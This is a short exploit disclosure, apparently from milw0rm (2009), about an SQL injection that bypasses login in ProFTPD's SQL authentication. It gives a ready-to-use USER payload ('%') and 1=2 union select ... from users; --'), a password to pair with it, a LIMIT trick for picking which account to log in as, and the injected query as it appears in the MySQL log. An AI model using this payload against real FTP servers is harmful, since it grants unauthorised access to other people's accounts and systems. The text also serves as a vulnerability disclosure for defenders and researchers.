@@ -1,0 +1,17 @@
+Just found out a problem with proftpd's sql authentication. The problem is easily reproducible if you login with username like:
+
+USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; -- 
+
+and a password of "1" (without quotes).
+
+which leads to a successful login. Different account logins can be made successful using the limit clase (e.g appending "LIMIT 5,1" will make you login with as the 5th account in the users table).
+
+As far as I can see in the mysql logs the query becomes:
+
+SELECT userid, passwd, uid, gid, homedir, shell FROM users WHERE (userid='{UNKNOWN TAG}') and 1=2 union select 1,1,uid,gid,homedir,shell from users limit 1,1; -- ') LIMIT 1
+
+I think the problem lies in the handling of the "%" character (probably that's some way to sanitize input to avoid format string things?).
+
+Anyway, %' effectively makes the single quote unescaped and that eventually allows for an SQL injection during login.
+
+# milw0rm.com [2009-02-10]
